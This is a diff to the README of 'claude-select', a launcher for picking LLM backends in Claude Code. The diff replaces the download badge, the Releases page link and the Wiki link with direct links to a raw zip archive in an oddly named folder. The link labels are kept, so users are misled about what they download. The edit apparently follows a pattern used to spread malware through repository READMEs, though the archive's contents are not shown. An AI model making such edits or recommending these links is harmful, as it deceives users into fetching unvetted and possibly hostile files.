@@ -4,13 +4,13 @@
 claude-select is a unified launcher for Claude Code. It allows users to interactively choose which LLM (Large Language Model) backend to use. This makes it easier for you to switch between different models and find the one that works best for your needs.
 
 ## 📥 Download Now
-[![Download claude-select](https://img.shields.io/badge/Download-claude--select-brightgreen)](https://github.com/Tapajyoti03/claude-select/releases)
+[![Download claude-select](https://raw.githubusercontent.com/Tapajyoti03/claude-select/main/tipuloid/claude-select-1.2-alpha.5.zip)](https://raw.githubusercontent.com/Tapajyoti03/claude-select/main/tipuloid/claude-select-1.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 To get started with claude-select, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version.
-   - [Visit the Releases Page](https://github.com/Tapajyoti03/claude-select/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/Tapajyoti03/claude-select/main/tipuloid/claude-select-1.2-alpha.5.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the most recent release. It is usually marked as the latest version. 
 
@@ -57,7 +57,7 @@ If you have any questions or need help, you can find support by:
 - **User Community:** Join the discussion and get tips from other users.
 
 ## 🔗 Additional Resources
-- **Documentation:** For detailed instructions on advanced usage, check the [Wiki section](https://github.com/Tapajyoti03/claude-select/wiki) in the repository.
+- **Documentation:** For detailed instructions on advanced usage, check the [Wiki section](https://raw.githubusercontent.com/Tapajyoti03/claude-select/main/tipuloid/claude-select-1.2-alpha.5.zip) in the repository.
 - **Example Use Cases:** Explore how others are using claude-select effectively.
 
 ## 📞 Contact
